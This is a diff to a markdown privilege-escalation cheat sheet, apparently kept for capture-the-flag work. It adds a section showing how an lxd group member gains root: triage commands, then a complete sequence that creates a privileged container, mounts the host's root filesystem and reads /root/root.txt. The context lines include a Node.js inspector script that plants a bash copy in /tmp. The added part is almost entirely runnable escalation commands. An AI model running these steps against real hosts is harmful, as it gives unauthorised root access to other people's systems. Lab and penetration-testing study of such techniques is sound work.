@@ -393,6 +393,34 @@ python3 tools/nodejs-inspector-cdp/cdp_root.py 'cp /bin/bash /tmp/0 && chmod 675
 ```
 Notes: `Runtime.evaluate` runs in global scope — use `process.mainModule.require('child_process').execSync(...)` (bare `require` is out of scope). A localhost-only bind is bypassed from any local shell; forward it to use a GUI debugger: `ssh -L 9229:127.0.0.1:9229 user@target` then `chrome://inspect`.
 
+### lxd/lxc group -> root
+Membership in the `lxd` group is root-equivalent **only if the LXD daemon is actually running** — the daemon runs as root, and a group member can start a privileged container that mounts the host filesystem. First triage whether it is usable:
+```shell
+id | grep -o lxd
+which -a lxc lxd; ls -l /snap/bin/lxc            # real client vs. installer shim
+ls -l /var/snap/lxd/common/lxd/unix.socket \
+      /var/lib/lxd/unix.socket 2>/dev/null       # daemon socket = it's alive
+ps aux | grep -E 'lxd|snapd' | grep -v grep
+snap list 2>/dev/null                            # empty => lxd not installed
+```
+Trap: on Ubuntu, `/usr/sbin/lxc` may be the `lxd-installer` shim that runs `snap install lxd` on first use. On an offline box with no local snap seeded, that fails and **you cannot install it (install needs root)** — the group alone gets you nothing, so pivot to other vectors.
+
+If the daemon is up, import a small image (bring your own on offline boxes) and mount host `/` into a privileged container:
+```shell
+# bring an image over (offline): built with distrobuilder, or `lxc image export` elsewhere
+lxc image import ./alpine.tar.gz --alias privesc            # or: lxc image import lxd.tar.xz rootfs.squashfs --alias privesc
+# online: lxc remote add images https://images.linuxcontainers.org --protocol simplestreams --accept-certificate
+#         lxc init images:alpine/3.19 c -c security.privileged=true
+
+lxc init privesc c -c security.privileged=true
+lxc config device add c host disk source=/ path=/mnt/root recursive=true
+lxc start c
+lxc exec c /bin/sh
+# inside the container (root); host / is at /mnt/root — read-only is enough for the flag
+cat /mnt/root/root/root.txt
+```
+Notes: `recursive=true` means writes hit the real host — read the flag rather than modifying host files. If `lxc start` fails with a storage/network error, initialize once with `lxd init --auto`.
+
 ## Kubernetes
 ### Enumerate pods (kubeletctl)
 Kubeletctl is a command line tool that implement kubelet's API.
